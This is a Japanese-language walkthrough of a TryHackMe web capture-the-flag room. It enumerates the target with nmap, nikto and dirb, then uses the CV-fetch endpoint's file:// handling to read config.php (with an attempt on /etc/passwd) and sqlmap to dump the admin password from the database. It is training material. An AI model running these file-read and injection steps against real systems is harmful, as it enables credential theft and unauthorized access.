# Recruit CTF

https://tryhackme.com/room/recruitwebchallenge

## Enumeration

```shell
TARGET=10.144.159.224
sudo bash -c "echo $TARGET   recruit.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
53/tcp open  domain  syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```

```sh
sudo nmap -sV -p22,53,80 $TARGET

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
53/tcp open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

SSH, DNS, HTTP

```sh
root@ip-10-144-117-25:~# nikto -p 80 -T 1 2 3 -h $TARGET
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.144.159.224
+ Target Hostname:    recruit.thm
+ Target Port:        80
+ Start Time:         2026-04-25 00:01:38 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ Cookie PHPSESSID created without the httponly flag
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ OSVDB-3268: /mail/: Directory indexing found.
+ OSVDB-3092: /mail/: This might be interesting...
+ Cookie phpMyAdmin created without the httponly flag
+ Cookie goto created without the httponly flag
+ Cookie back created without the httponly flag
+ Cookie pma_lang created without the httponly flag
+ Uncommon header 'x-webkit-csp' found, with contents: default-src 'self' ;script-src 'self'  'unsafe-inline' 'unsafe-eval';referrer no-referrer;style-src 'self' 'unsafe-inline' ;img-src 'self' data:  *.tile.openstreetmap.org;object-src 'none';
+ Uncommon header 'x-ob_mode' found, with contents: 1
+ Uncommon header 'x-permitted-cross-domain-policies' found, with contents: none
+ Uncommon header 'x-frame-options' found, with contents: DENY
+ Uncommon header 'x-xss-protection' found, with contents: 1; mode=block
+ Uncommon header 'x-content-security-policy' found, with contents: default-src 'self' ;options inline-script eval-script;referrer no-referrer;img-src 'self' data:  *.tile.openstreetmap.org;object-src 'none';
+ Uncommon header 'content-security-policy' found, with contents: default-src 'self' ;script-src 'self' 'unsafe-inline' 'unsafe-eval' ;style-src 'self' 'unsafe-inline' ;img-src 'self' data:  *.tile.openstreetmap.org;object-src 'none';
+ Uncommon header 'x-robots-tag' found, with contents: noindex, nofollow
+ Uncommon header 'x-content-type-options' found, with contents: nosniff
+ Uncommon header 'referrer-policy' found, with contents: no-referrer
+ /phpmyadmin/: phpMyAdmin directory found
+ 1707 items checked: 0 error(s) and 20 item(s) reported on remote host
+ End Time:           2026-04-25 00:01:41 (GMT1) (3 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

## Web

ログイン画面が表示され、/api.php のリンクがある。

```
採用APIは、採用プロセスにおいて、外部ソースから候補者の履歴書を取得および処理するために社内で使用されます。
```

ソースを見ると、/file.php の使い方が書かれていた。

```html
How can I fetch a candidate CV using the API?

You can fetch a candidate CV using the following endpoint:
<pre class="mt-2"><code>/file.php?cv=&lt;URL&gt;</code></pre>
```

HTTP, HTTPS をサポート

```
What kind of URLs are supported?

The API supports fetching CVs from external URLs such as HTTP and HTTPS.
```


```
Are there any security restrictions?

Requests targeting restricted locations may be blocked by the API.
```

### ディレクトリ列挙

```sh
dirb http://$TARGET

---- Scanning URL: http://10.144.159.224/ ----
==> DIRECTORY: http://10.144.159.224/assets/                                                                        
+ http://10.144.159.224/index.php (CODE:200|SIZE:1417)                                                              
==> DIRECTORY: http://10.144.159.224/javascript/                                                                    
==> DIRECTORY: http://10.144.159.224/mail/                                                                          
==> DIRECTORY: http://10.144.159.224/phpmyadmin/                                                                    
+ http://10.144.159.224/server-status (CODE:403|SIZE:279)                                                           
+ http://10.144.159.224/sitemap.xml (CODE:200|SIZE:1710)
```


/mail/mail.log

```txt
May 14 09:32:11 recruit-server postfix/smtpd[2143]: connect from hr-workstation.local[10.10.5.23]
May 14 09:32:12 recruit-server postfix/smtpd[2143]: 4F1A2203F: client=hr-workstation.local[10.10.5.23]
May 14 09:32:13 recruit-server postfix/cleanup[2146]: 4F1A2203F: message-id=<20240514093213.4F1A2203F@recruit.local>
May 14 09:32:13 recruit-server postfix/qmgr[1789]: 4F1A2203F: from=<hr@recruit.thm>, size=1824, nrcpt=1 (queue active)
May 14 09:32:14 recruit-server postfix/local[2151]: 4F1A2203F: to=<it-support@recruit.local>, relay=local, delay=0.34, status=sent

------------------------------------------------------------
From: HR Team <hr@recruit.thm>
To: IT Support <it-support@recruit.thm>
Date: Tue, 14 May 2024 09:32:10 +0000
Subject: Recruitment Portal Deployment Confirmation

Hi Team,

Just a quick update to confirm that the new Recruitment Portal
has been deployed successfully and is functioning as expected.

Weâ€™ve completed basic validation:
- Login page is accessible
- Candidate dashboard loads correctly
- API documentation page is live

As discussed during deployment:
- HR login credentials (username: hr) are currently stored in the application
  configuration file (config.php) for ease of access during
  the initial rollout phase.
- Administrator credentials are NOT stored in the application
  files and are securely maintained within the backend database.

Please let us know if there are any issues or if further changes
are required.

Thanks,
HR Operations
Recruitment Team
------------------------------------------------------------

May 14 09:32:14 recruit-server postfix/qmgr[1789]: 4F1A2203F: removed
```

- hr ユーザーの認証情報が config.php にある
- adminユーザーの認証情報はDBにある

sitemap.xml

```xml
This XML file does not appear to have any style information associated with it. The document tree is shown below.
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
<!--  Public Pages  -->
<url>
<loc>http://recruit.thm/</loc>
<changefreq>daily</changefreq>
<priority>1.0</priority>
</url>
<url>
<loc>http://recruit.thm/index.php</loc>
<changefreq>daily</changefreq>
<priority>1.0</priority>
</url>
<!--  API & Documentation  -->
<url>
<loc>http://recruit.thm/api.php</loc>
<changefreq>weekly</changefreq>
<priority>0.8</priority>
</url>
<!--  CV Retrieval Service  -->
<url>
<loc>http://recruit.thm/file.php</loc>
<changefreq>weekly</changefreq>
<priority>0.6</priority>
</url>
<!--  Mails  -->
<url>
<loc>http://recruit.thm/mail/</loc>
<changefreq>monthly</changefreq>
<priority>0.5</priority>
</url>
<!--  Authenticated Pages  -->
<url>
<loc>http://recruit.thm/dashboard.php</loc>
<changefreq>weekly</changefreq>
<priority>0.4</priority>
</url>
<url>
<loc>http://recruit.thm/logout.php</loc>
<changefreq>monthly</changefreq>
<priority>0.2</priority>
</url>
<!--  Static Assets  -->
<url>
<loc>http://recruit.thm/assets/</loc>
<changefreq>monthly</changefreq>
<priority>0.1</priority>
</url>
<!-- 
        Notes:
        - Some directories may contain internal documentation or logs.
        - Certain endpoints are intended for internal HR integrations.
        - Access to sensitive data is role-restricted.
     -->
</urlset>
```

```txt
注記：
- 一部のディレクトリには、内部文書やログが含まれている場合があります。
- 一部のエンドポイントは、社内人事システムとの連携を目的としています。
- 機密データへのアクセスは、役割によって制限されています。
```

## /file.php

```sh
$ curl http://recruit.thm/file.php?cv=http://recruit.thm/config.php              
Only local files are allowed                                                                                                                    
$ curl http://recruit.thm/file.php?cv=http://recruit.local/config.php
Only local files are allowed                                                                                                                    
$ curl http://recruit.thm/file.php?cv=http://localhost/config.php
Only local files are allowed                                                                                                                    
$ curl http://recruit.thm/file.php?cv=file:///etc/passwd         
Access denied
```

file:// が機能している感触がある。

config.php を取れた。

```sh
$ curl http://recruit.thm/file.php?cv=file:///var/www/html/config.php
<?php

/*
|--------------------------------------------------------------------------
| Application Configuration
|--------------------------------------------------------------------------
*/

$APP_NAME        = 'Recruit';
$APP_ENV         = 'production';
$APP_VERSION     = '1.2.4';
$APP_DEBUG       = false;

/*
|--------------------------------------------------------------------------
| HR Credentials (Temporary – Initial Rollout Phase)
|--------------------------------------------------------------------------
| NOTE:
| These credentials are stored here temporarily for ease of access
| during the initial deployment and will be moved to the database
| in a future release.
*/

$HR_PASSWORD = '[REDACTED]';

/*
|--------------------------------------------------------------------------
| API Configuration
|--------------------------------------------------------------------------
*/

$API_ENABLED     = true;
$API_VERSION     = 'v1';


?>
```

このパスワードを使いログイン成功、フラグ１回収。

## admin

検索機能をsqlmapにかけたら脆弱性が見つかった。

```sh
$ sqlmap -r search.txt --dbs --batch

available databases [6]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] recruit_db
[*] sys
```

ダンプ

```sh
Database: recruit_db
Table: users
[1 entry]
+----+----------------+----------+
| id | password       | username |
+----+----------------+----------+
| 1  | [REDACTED] | admin    |
+----+----------------+----------+
```

このパスワードでログインしてフラグ２回収。

## 振り返り

- Medium 分類だったが、Easy。
- DNSで何かあってほしかった気はする。

## Tags

#tags:LFI #tags:SQLインジェクション
